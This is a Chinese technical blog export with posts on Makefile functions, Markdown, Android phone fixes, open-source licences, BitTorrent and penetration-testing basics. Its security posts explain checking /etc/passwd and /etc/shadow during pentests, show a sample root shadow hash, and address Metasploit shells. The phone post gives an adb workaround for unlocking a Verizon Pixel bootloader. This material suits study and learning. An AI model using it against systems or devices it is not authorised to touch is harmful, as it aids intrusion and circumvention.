<li><code>$(patsubst)</code>：用于模式匹配的替换，语法为 <code>$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;)</code></li>
<li><code>$(filter)</code>：</li>
<li><code>$(addsuffix)</code>：</li>
<li><code>$(addprefix)</code>：</li>
<li><code>$(if)</code>：</li>
<li><code>$(foreach)</code>：</li>
<li><code>$(call)</code>：唯一一个可以用来创建新的参数化的函数，语法为 <code>$(call &lt;expression&gt;,&lt;parm1&gt;,&lt;parm2&gt;,...,&lt;parmn&gt;)</code>，值得注意的是，call 函数在处理参数时，第 2 个及其之后的参数中的空格会被保留，因而在向 call 函数提供参数时，最安全的做法是去除所有多余的空格，避免造成一些奇怪的效果。</li>
</ul>
<p>相关示例如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell函数用法</span></span><br><span class="line">contents := <span class="variable">$(<span class="built_in">shell</span> cat foo)</span> <span class="comment"># 将foo文件中的内容赋值给contents</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call函数用法</span></span><br><span class="line">reverse =  $(2) $(1)</span><br><span class="line">foo = <span class="variable">$(<span class="built_in">call</span> reverse,a,b)</span> <span class="comment"># 最终foo的值为b a</span></span><br></pre></td></tr></table></figure>

<p>更多的内置函数可以参考 <a href="https://www.gnu.org/software/make/manual/html_node/Functions.html">make 官方手册</a></p>
<h2 id="引用其它的-Makefile"><a href="#引用其它的-Makefile" class="headerlink" title="引用其它的 Makefile"></a>引用其它的 Makefile</h2><p>在 Makefile 中可以使用 <code>include</code> 关键字把别的 Makefile 包含进来，这很像 C 语言的 <code>#include</code>，被包含的文件会原模原样的放在当前文件的包含位置。<code>include</code> 的语法是：<code>include &lt;filename&gt;</code>，其中被包含的 Makefile 文件通常以 <code>.mk</code> 结尾。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown 小记</title>
    <url>/2018/07/21/markdown-cheatsheet/</url>
    <content><![CDATA[<p>Markdown 是一种轻量<strong>标记语言</strong>，其文件后缀名为 <code>.md</code>，它允许人们采用其规定的语法编写文档，而后 Markdown 解析器会将其转化为有效的 HTML 文档，以便在网页中显示，时至今日，有许多 Markdown 解析器增强了 Markdown 的基本语法，这就造成了 Markdown 有多种<strong>风格</strong>（flavor）。</p>
<p>因为 Markdown 要被转化为 HTML 才能在网页上显示，所以在 Markdown 中仍然可以使用 HTML，如果有 Markdown 无法完成的工作，完全可以再用回 HTML。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br></pre></td></tr></table></figure>

<p>对应 HTML，最高 6 级标题。</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> 无序列表项</span><br><span class="line"><span class="bullet">  -</span> 这是是嵌套列表项</span><br><span class="line"><span class="bullet">  -</span> 这里也是嵌套列表项</span><br><span class="line"><span class="bullet">-</span> 无序列表项</span><br><span class="line"><span class="bullet">-</span> 无序列表项</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 有序列表项</span><br><span class="line"><span class="bullet">2.</span> 有序列表项</span><br><span class="line"><span class="bullet">3.</span> 有序列表项</span><br></pre></td></tr></table></figure>

<p>无序列表项常以 <code>-</code> 或 <code>*</code> 起始，个人习惯使用 <code>-</code>。</p>
<span id="more"></span>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">Howie&#x27;s Blog</span>](<span class="link">https://howiezhao.com</span>)</span><br></pre></td></tr></table></figure>

<p>超文本链接必须带 http/https。</p>
<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">一张图片</span>](<span class="link">/images/abc.jpg</span>)</span><br></pre></td></tr></table></figure>

<p>当图片无法显示时，则显示中括号中的语句。</p>
<p>图片的路径为相对路径，即当前 Markdown 文件所在路径下的 <code>images</code> 中的 <code>abc.jpg</code>。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span></span><br><span class="line"><span class="strong">**粗体**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体<span class="strong">**<span class="emphasis">*</span></span></span></span></span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>```<br>这里是多行代码<br>```</p>
<p>`这里是单行代码`</p>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">表头1 | 表头2</span><br><span class="line">--- | ---</span><br><span class="line">单元格1 | 单元格2</span><br><span class="line">单元格3 | 单元格4</span><br></pre></td></tr></table></figure>

<p>上下应该各空一行</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="quote">&gt; 这是引用</span></span><br></pre></td></tr></table></figure>

<h3 id="横线"><a href="#横线" class="headerlink" title="横线"></a>横线</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">----</span><br></pre></td></tr></table></figure>

<p>这是一条水平区分线，用 3 个或以上的短横线表示，个人习惯使用 4 个短横线。</p>
<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>和传统编程语言一样，Markdown 使用 <code>\</code> 转义以上特殊字符。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ol>
<li>在特殊字符与要书写的文字之间加上空格</li>
<li>不同段之间加一空行</li>
<li>链接后加一个空格</li>
</ol>
<h2 id="GitHub-Flavored-Markdown"><a href="#GitHub-Flavored-Markdown" class="headerlink" title="GitHub Flavored Markdown"></a>GitHub Flavored Markdown</h2><p>GitHub Flavored Markdown，简记为 <strong>GFM</strong>，即 <strong>GitHub 风格的 Markdown 语法</strong>，是 GitHub 中编辑器使用的 Markdown 语法格式，略微区别于标准的 Markdown 语法，主要如下：</p>
<ol>
<li>链接自动识别：GFM 会自动为标准的 URL 加上链接</li>
<li>语法着色：在 <code>```</code> 后输入语言名称，即可着色，要查看支持的语言列表，请参考<a href="https://github.com/github/linguist/blob/master/lib/linguist/languages.yml">官方文档</a></li>
<li>删除线：使用 <code>~~</code> 表示删除线</li>
<li>任务列表：使用 <code>- [ ]</code> 或 <code>- [x]</code> 表示未勾选或已勾选的任务列表</li>
<li>Emoji：使用 <code>:EMOJICODE:</code> 可以显示 Emoji 表情，比如 <code>:+1:</code> 表示一个👍，要查看完整的 Emoji 编码，可参考 <a href="https://www.webpagefx.com/tools/emoji-cheat-sheet/">Emoji cheat sheet</a></li>
</ol>
<p>要了解 GFM 的更多特性，可以参考 <a href="https://docs.github.com/cn/github/writing-on-github">GitHub 官方的文档</a>。</p>
<h2 id="CommonMark"><a href="#CommonMark" class="headerlink" title="CommonMark"></a>CommonMark</h2><p>为了解决 Markdown 风格太多的问题，诞生了 <a href="https://commonmark.org/">CommonMark</a> 项目，其制定了一系列的语法规范，按照此语法规范书写的 Markdown 文档可以得到更好的兼容性。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="https://dillinger.io/">Dillinger</a> 是一个开源在线的 Markdown 编辑器。</p>
<p>Sublime Text 拥有众多的 Markdown 插件，其中 <a href="https://packagecontrol.io/packages/MarkdownPreview">Markdown​Preview</a> 可以在浏览器中预览 Markdown 文件，而 <a href="https://packagecontrol.io/packages/MarkdownEditing">Markdown​Editing</a> 可以快速的编辑 Markdown 文件。</p>
<p>为了检查你书写的 Markdown 是否符合规范，可以使用相应的 linter <a href="https://github.com/igorshubovych/markdownlint-cli">markdownlint-cli</a> 命令行工具。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>形而上与形而下</title>
    <url>/2018/05/01/metaphysics-physics/</url>
    <content><![CDATA[<p>形而上者谓之道，形而下者谓之器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Metasploit 中 shell 中文乱码解决方案</title>
    <url>/2017/12/04/metasploit-luanma/</url>
    <content><![CDATA[<p>有时在 Kali Linux 中获得了一个 Windows shell 或者在 meterpreter 中进入 shell 后，执行命令可能会出现中文乱码，其原因是 Windows 和 Linux 的编码不同，导致 Windows 中的中文在 Linux 中无法正常显示。</p>
<p><strong>解决方法：</strong></p>
<ol>
<li>在 shell 窗口的工具栏选择“编辑” ——&gt; “首选项” ——&gt; “编码”，选中简体中文的三个编码：GB18030、GB2312、GBK，打勾并退出</li>
<li>接着在“终端” ——&gt; “设定字符编码”中选择添加的三个简体中文编码之一即可</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li>这个设置会随着操作系统的重启而失效</li>
<li>设定简体中文编码之后，Linux 中的中文字符就会乱码，因为 Linux 使用 UTF-8 编码</li>
<li>建议只在需要的时候设定简体中文编码</li>
</ul>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>微软平台技术简介</title>
    <url>/2018/09/22/microsoft-technology/</url>
    <content><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>微软最初的操作系统的DOS，DOS只是一个命令行形式，后来</p>
<h2 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h2><h2 id="Windows-Phone"><a href="#Windows-Phone" class="headerlink" title="Windows Phone"></a>Windows Phone</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>MIME Type</title>
    <url>/2018/05/09/mime-type/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Nexus/Pixel 相关问题解决</title>
    <url>/2019/07/21/nexus-pixel-problem/</url>
    <content><![CDATA[<h2 id="移动网络-WiFi-出现叹号或叉号"><a href="#移动网络-WiFi-出现叹号或叉号" class="headerlink" title="移动网络/WiFi 出现叹号或叉号"></a>移动网络/WiFi 出现叹号或叉号</h2><p>Captive Portal 是从 Android 5 开始引入的一项新功能，其主要用于检测网络连接是否正常，当用户连接网络后，系统会通过 HTTP 访问一个 Google 的服务器，若返回 200 状态码，则表示用户可能处在一个需要登录认证的网络环境中；若返回 204 状态码，则表示网络连接正常；若连接超时，则表示网络连接不正常，此时网络图标会显示一个叹号或叉号。</p>
<p>显然，Google 的服务器是连接不上的，我们可以通过修改服务器地址来解决此问题。具体而言，连接 ADB，针对不同的系统版本，下方分别给出了相关命令：</p>
<p>Android 9.0/8.1/8.0/7.1.2/7.1.1：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204</span><br></pre></td></tr></table></figure>

<p>Android 7.1/7.0：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings delete global captive_portal_server  </span><br><span class="line">adb shell settings put global captive_portal_detection_enabled 0</span><br></pre></td></tr></table></figure>

<p>Android 5.0-6.x：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global captive_portal_server www.google.cn</span><br></pre></td></tr></table></figure>

<p>执行之后，开启飞行模式，接着关闭飞行模式即可。</p>
<span id="more"></span>
<h2 id="搜索不到-WiFi"><a href="#搜索不到-WiFi" class="headerlink" title="搜索不到 WiFi"></a>搜索不到 WiFi</h2><p>因为美国 2.4GHz 频段的 WiFi 信道为 1-11，而中国 2.4GHz 频段的 WiFi 信道为 1-13，所以当 2.4GHz 频段的 WiFi 信道位于 12 或 13 时，美版的 Nexus/Pixel 会搜索不到 WiFi，此时可通过重启路由器，使其自动更换信道，或进入路由器设置页面，将信道改为 11 以内任意信道即可。</p>
<h2 id="4G-信号问题"><a href="#4G-信号问题" class="headerlink" title="4G 信号问题"></a>4G 信号问题</h2><p>由于联通的网络制式一直采用的是国际通用的网络制式，所以 Nexus/Pixel 可以完美支持联通 2G/3G/4G。</p>
<p>移动的 3G 网络制式采用的是自主研发的技术，所以 Nexus/Pixel 并不支持移动 3G，然而移动 4G 网络制式采用的是自主研发和国际通用并行的方式，所以 Nexus/Pixel 只支持部分移动 4G 频段。</p>
<p>简单来说，Nexus/Pixel 完美支持联通 2G/3G/4G，支持移动 2G，不支持移动 3G，部分支持移动 4G（具体表现为在城市有 4G 网络，在农村没有 4G 网络），电信 2G/3G/4G 可通过破解（本文不讨论这点）实现支持。</p>
<h2 id="Google（即负一屏）无法使用"><a href="#Google（即负一屏）无法使用" class="headerlink" title="Google（即负一屏）无法使用"></a>Google（即负一屏）无法使用</h2><h2 id="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"><a href="#接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）" class="headerlink" title="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"></a>接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）</h2><p>严格来说，这不算是 Nexus/Pixel 特有的问题，究其原因是距离感应器坏了，可通过设置使用电源键挂断电话，具体方法为在<strong>设置</strong> —&gt; <strong>辅助功能/无障碍</strong>中开启<strong>按电源按钮结束通话</strong>。</p>
<h2 id="蓝牙传输失败，显示不支持此内容"><a href="#蓝牙传输失败，显示不支持此内容" class="headerlink" title="蓝牙传输失败，显示不支持此内容"></a>蓝牙传输失败，显示不支持此内容</h2><p>由于版权问题，原生 Android 不支持传输以 <code>.apk</code> 结尾的文件，可通过将其改为 <code>.jpg</code> 结尾传输。</p>
<h2 id="Google-Play-商店更新应用卡住"><a href="#Google-Play-商店更新应用卡住" class="headerlink" title="Google Play 商店更新应用卡住"></a>Google Play 商店更新应用卡住</h2><p>在 Android 9.0 之前，Play 商店是通过<strong>下载管理器</strong>下载应用的，出现这种情况可以直接将<strong>下载管理器</strong>强行停止，然后重新启动 Play 商店即可更新应用。在 Android 9.0 之后，可直接将 Play 商店强行停止再重新启动即可。</p>
<h2 id="系统无法更新"><a href="#系统无法更新" class="headerlink" title="系统无法更新"></a>系统无法更新</h2><p>具体表现为<strong>系统更新</strong>处永远显示<strong>正在安装系统更新</strong>，一般来说，这是由于网络原因引起的，目前并没有一个稳定的解决办法，建议直接下载新系统镜像并线刷。你可以在<a href="https://developers.google.cn/android/images">这个官方地址</a>找到有关 Nexus/Pixel 的所有出厂镜像，其中也附带有详细的安装方法。</p>
<p>具体而言，你需要先解锁 Bootloader，然后连接 ADB，紧接着执行 <code>adb reboot bootloader</code> 进入 fastboot 模式，最后执行相应系统的 <code>flash-all</code> 脚本即可。</p>
<h2 id="Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程"><a href="#Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程" class="headerlink" title="Pixel/Pixel XL Verizon 版解锁 Bootloader 教程"></a>Pixel/Pixel XL Verizon 版解锁 Bootloader 教程</h2><p>教程来源自 xda 上的一篇<a href="https://www.xda-developers.com/unlock-bootloader-verizon-google-pixel-xl/">文章</a>，具体步骤如下：</p>
<ol>
<li>从您的设备中删除 Google 帐户和任何类型的屏幕锁定（指纹，PIN，图案等）。</li>
<li>从您的设备中取出 SIM 卡。</li>
<li>重置您的设备。在设置向导中，跳过所有内容，不要连接到 WiFi，不要添加指纹或任何类型的屏幕锁定。</li>
<li>转到开发人员选项并启用 USB 调试。</li>
<li>将手机连接到 PC。</li>
<li>在 adb 目录中打开 CMD 并输入：<code>adb shell pm uninstall --user 0 com.android.phone</code></li>
<li>重启您的设备。</li>
<li>连接到 WiFi，打开 Chrome 并转到 google.com（或任何网站）。</li>
<li>转到开发人员选项并启用 OEM 解锁。</li>
<li>重启到 bootloader 并通过 CMD 运行：<code>fastboot oem unlock</code> 或 <code>fastboot flashing unlock</code>。</li>
<li>完成。</li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>开源协议漫谈</title>
    <url>/2018/11/02/open-sourse-license/</url>
    <content><![CDATA[<p><strong>开源协议</strong>（Open Source License）往往又被称为<strong>开源许可证</strong>，世界上的开源协议大约有上百种，但最常见的也无非6种而已，即GPL、LGPL、Mozilla、Apache、BSD和MIT，下文将逐个介绍，此外，本文还介绍了CC BY-NC-SA协议。</p>
<span id="more"></span>
<h2 id="GPL"><a href="#GPL" class="headerlink" title="GPL"></a>GPL</h2><p><a href="https://www.gnu.org/licenses/gpl.html">GPL</a>全称GNU General Public License，即<strong>GNU通用公共许可协议</strong>，这是由GNU开源组织发起的，目前最新版是3.0。</p>
<h2 id="LGPL"><a href="#LGPL" class="headerlink" title="LGPL"></a>LGPL</h2><p><a href="https://www.gnu.org/licenses/lgpl-3.0.en.html">LGPL</a>全称GNU Lesser General Public License，即<strong>GNU宽通用公共许可证</strong>，这也是由GNU开源组织发起的，目前最新版是3.0。</p>
<h2 id="Mozilla"><a href="#Mozilla" class="headerlink" title="Mozilla"></a>Mozilla</h2><p><a href="https://www.mozilla.org/en-US/MPL/">Mozilla Public License</a>简称MPL，这是由Mozilla开源组织发起的，目前最新版是2.0。</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p><a href="https://www.apache.org/licenses/">Apache License</a>是由Apache开源组织发起的，目前最新版是2.0。</p>
<h2 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h2><p>BSD License是由加州大学伯克利分校发起的，</p>
<h2 id="MIT"><a href="#MIT" class="headerlink" title="MIT"></a>MIT</h2><p>MIT License是由麻省理工学院发起的</p>
<h2 id="CC-BY-NC-SA"><a href="#CC-BY-NC-SA" class="headerlink" title="CC BY-NC-SA"></a>CC BY-NC-SA</h2><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>全称Creative Commons-Attribution-Noncommercial-ShareAlike，即<strong>创作共享-署名-非商业性-相同方式共享</strong>，这是由<strong>创作共享</strong>组织发起的，目前最新版是4.0。</p>
<h2 id="作何选择"><a href="#作何选择" class="headerlink" title="作何选择"></a>作何选择</h2><p>如何简单快速的选择自己所需的开源协议呢？乌克兰程序员Paul Bagwell制作了一张分析图，国内程序员阮一峰根据此图制作出了中文版，图片如下（摘选自阮一峰博客<a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html">如何选择开源许可证？</a>）：<img src="/images/license.png" alt="license">此外，<a href="https://choosealicense.com/">https://choosealicense.com/</a> 是一个不错的网站，它使你通过回答一些问题来选择合适的开源协议。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>P2P 与 BitTorrent</title>
    <url>/2020/12/15/p2p-bittorrent/</url>
    <content><![CDATA[<p>P2P 是一种<strong>体系结构</strong>，就好像 C/S 体系结构一样，但不同的是，P2P 对总是打开的基础设施服务器有最小的（或者没有）依赖，成对间歇连接的主机（称为<strong>对等方</strong>）彼此直接通信。</p>
<p>基于 P2P 这种体系结构产生了许多应用，譬如<strong>文件分发应用</strong>和<strong>分布式散列表</strong>（DHT），而文件分发应用中一个典型的例子就是 BitTorrent 协议。</p>
<p>如果要类比 P2P 与 BitTorrent 之间的关系，就好像 C/S 体系结构与 FTP 协议之间的关系。</p>
<span id="more"></span>

<h2 id="P2P-与-C-S"><a href="#P2P-与-C-S" class="headerlink" title="P2P 与 C/S"></a>P2P 与 C/S</h2><p>以文件分发应用为例，在 C/S 文件分发中，该服务器必须向每个对等方发送该文件的一个副本，即服务器承受了极大的负担，并且消耗了大量的服务器带宽。在 P2P 文件分发中，每个对等方能够向任何其他对等方重新分发它已经收到的该文件的任何部分，从而在分发过程中协助该服务器。</p>
<p>对于 C/S 体系结构，随着对等方数量的增加，分发时间呈线性增长并且没有界。然而，对于 P2P 体系结构，最小分发时间不仅总是小于 C/S 体系结构的分发时间，并且对于任意的对等方数量，总是小于一对一的 C/S 体系结构的分发时间。因此，具有 P2P 体系结构的应用程序能够是自扩展的。这种扩展性的直接成因是：<strong>对等方除了是比特的消费者外还是它们的重新分发者</strong>。</p>
<h2 id="BitTorrent"><a href="#BitTorrent" class="headerlink" title="BitTorrent"></a>BitTorrent</h2><p>如前所述，BitTorrent 是最为流行的 P2P 文件分发协议，通常也简称为 BT，最初由 Bram Cohen 所研发。</p>
<p>用 BitTorrent 的术语来讲，参与一个特定文件分发的所有对等方的集合被称为一个<strong>洪流（torrent）</strong>。在一个洪流中的对等方彼此下载等长度的<strong>文件块</strong>（chunk），典型的块长度为 256 KB。当一个对等方首次加入一个洪流时，它没有块。随着时间的流逝，它累积了越来越多的块。当它下载块时，也为其他对等方上载了多个块。一旦某对等方获得了整个文件，它也许（自私地）离开洪流，或（大公无私地）留在该洪流中并继续向其他对等方上载块。同时，任何对等方可能在任何时候仅具有块的子集就离开该洪流，并在以后重新加入该洪流中。</p>
<p>每个洪流具有一个基础设施节点，称为 <strong>tracker</strong>（追踪器）。当一个对等方加入某洪流时，它向 tracker 注册自己，并周期性地通知 tracker 它仍在该洪流中。以这种方式，tracker 跟踪参与在洪流中的对等方。</p>
<p>当一个新的对等方 A 加入该洪流时，tracker 随机地从参与对等方的集合中选择对等方的一个子集，将这个子集中每个对等方的 IP 地址发送给 A。A 持有对等方的这张列表，试图与该列表上的所有对等方创建并行的 TCP 连接。我们称所有这样与 A 成功地创建一个 TCP 连接的对等方为<strong>邻近对等方</strong>。一个对等方的临近对等方将随时间而波动。</p>
<p>在任何给定的时刻，A 将具有块的子集并知道它的邻居具有哪些块。利用这些信息，A 将做出两个重要决定：</p>
<ul>
<li>它应当从它的邻居请求哪些块呢？</li>
<li>它应当向哪些向它请求块的邻居发送块？</li>
</ul>
<p>在决定请求哪些块的过程中，A 使用一种称为<strong>最稀缺优先</strong>（rarest first）的技术。这种技术的思路时，针对它没有的块在它的邻居中决定最稀缺的块（最稀缺的块就是那些在它的邻居中副本数量最少的块），并首先请求那些最稀缺的块。这样，最稀缺块得到更为迅速的重新发放，其目标是（大致地）均衡每个块在洪流中的副本数量。</p>
<p>为了决定它响应哪个请求，BitTorrent 使用了一种被称为<strong>一报还一报</strong>（tit-for-tat）的交换激励机制。其基本想法是，A 根据当前能够以 <em>最高速率</em> 向它提供数据的邻居，给出其优先权。特别是，A 对于它的每个邻居都持续地测量接收到比特的速率，并确定以最高速率流入的 4 个邻居。每过 10 秒，它重新计算该速率并可能修改这 4 个对等方的集合。用 BitTorrent 术语来说，这 4 个对等方被称为<strong>疏通</strong>（unchoked）。重要的是，每过 30 秒，它也要随机地选择另外一个邻居并向其发送块。我们将这个被随机选择的对等方称为 B。现在站在 B 的角度上看，因为 A 正在向 B 发送数据，它可能成为 B 前 4 位上载者之一，这样的话 B 将开始向 A 发送数据。如果 B 向 A 发送数据的速率足够高，B 接下来也能成为 A 的前 4 位上载者。换言之，每过 30 秒 A 将随机地选择一名新的对换伴侣并开始与那位伴侣进行对换。如果这两名对等方都满足此对换，它们将对方放入其前 4 位列表中并继续与对方进行对换，直到该对等方之一发现了一个更好的伴侣为止。这种效果是对等方能够以趋向于找到彼此的协调的速率上载。随机选择邻居也允许新的对等方得到块，因此它们能够具有对换的东西。除了这 5 个对等方（<em>前</em> 4 个对等方和一个试探的对等方）的所有其他相邻对等方均被 <em>阻塞</em>，即它们不能从 A 接收到任何块。</p>
<h2 id="BitTorrent-客户端"><a href="#BitTorrent-客户端" class="headerlink" title="BitTorrent 客户端"></a>BitTorrent 客户端</h2><p>就如同 FTP 协议有众多的 FTP 客户端一样，BitTorrent 协议也有众多的 BitTorrent 客户端。最早的 BitTorrent 客户端应该是由 BitTorrent 发明人 Bram Cohen 开发的，很巧，软件的名字也叫 <a href="https://www.bittorrent.com/zh-cn/">BitTorrent</a>，现在已经成长为一家公司，也收购了著名的开源 BitTorrent 客户端 <a href="https://www.utorrent.com/intl/zh_cn/">µTorrent</a>。</p>
<p>出于种种原因，现在并不推荐使用以上两款软件，BitTorrent 发明人 Bram Cohen 也已经离开了那家公司，更推荐使用开源跨平台的 <a href="https://www.qbittorrent.org/">qBittorrent</a>。</p>
<!--迅雷-->

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>如前所述，tracker 服务器是一个 BitTorrent 网络的重点，大部分客户端都支持自定义 tracker 列表，GitHub 上就有一些精选的 tracker 列表：</p>
<ul>
<li><a href="https://github.com/ngosang/trackerslist">https://github.com/ngosang/trackerslist</a></li>
<li><a href="https://github.com/XIU2/TrackersListCollection">https://github.com/XIU2/TrackersListCollection</a></li>
</ul>
<p>为了降低对 tracker 服务器的依赖，BitTorrent 中也使用到了前面提到的分布式散列表（DHT）。</p>
<!--
[IKnowWhatYouDownload](https://iknowwhatyoudownload.com/en/peer/)
-->
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 中 /etc/passwd 与 /etc/shadow 的区别</title>
    <url>/2018/04/29/passwd-and-shadow/</url>
    <content><![CDATA[<p>简单来说，<code>/etc/passwd</code> 存储一般的用户信息，任何人都可以访问；<code>/etc/shadow</code> 存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍：</p>
<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a><code>/etc/passwd</code></h2><p>早期的 Linux 中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来 Linux 将用户密码存储到了 <code>/etc/shadow</code> 文件中，并将其权限设为仅 root 用户。</p>
<p>在渗透过程中，这两个文件最好都检查。</p>
<p><code>/etc/passwd</code> 的文件格式为：<strong>用户名:密码:用户 ID:用户组 ID:注释:用户目录:登录 shell</strong>，共 7 项，默认情况下，root 的用户 ID 为 0，1-99 表示预定义用户，100-999 表示其他系统帐户，新建的其他用户 ID 从 1000 起，用户组 ID 代表的详细信息存储在 <code>/etc/group</code> 文件中，如果密码被存储在了 <code>/etc/shadow</code> 文件中，则此文件中密码项为 x，常见形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a><code>/etc/shadow</code></h2><p><code>/etc/shadow</code> 的文件格式为：<strong>用户名:密码:上次修改密码日期（从 1970 年 1 月 1 日起的天数）:密码在两次修改期间的最小天数（0 表示可在任何时间修改）:密码需要被变更的天数（99999 表示不需要变更）:密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段</strong>，共 9 项，如果密码项以 <code>!</code> 或 <code>*</code>  起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：<strong>$加密方法 ID$Salt$加密值</strong>，常见形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透中 PoC、Exp、Payload 与 Shellcode 的区别</title>
    <url>/2018/04/29/payload-shellcode-exp-poc/</url>
    <content><![CDATA[<p>PoC，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
<p>Exp，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<p>Payload，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
<p>Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
<span id="more"></span>

<h2 id="几点注意"><a href="#几点注意" class="headerlink" title="几点注意"></a>几点注意</h2><p>PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。</p>
<p>Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。</p>
<p>Shellcode 也有很多种，包括正向的，反向的，甚至 meterpreter。</p>
<p>Shellcode 与 Shellshcok 不是一个，Shellshock 特指 14 年发现的 Shellshock 漏洞。</p>
<h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>在 Metasploit Framework 6 大模块中有一个 Payload 模块，在该模块下有 Single、Stager、Stages 这三种类型，Single 是一个 all-in-one 的 Payload，不依赖其他的文件，所以它的体积会比较大，Stager 主要用于当目标计算机的内存有限时，可以先传输一个较小的 Stager 用于建立连接，Stages 指利用 Stager 建立的连接下载后续的 Payload。Stager 和 Stages 都有多种类型，适用于不同场景。</p>
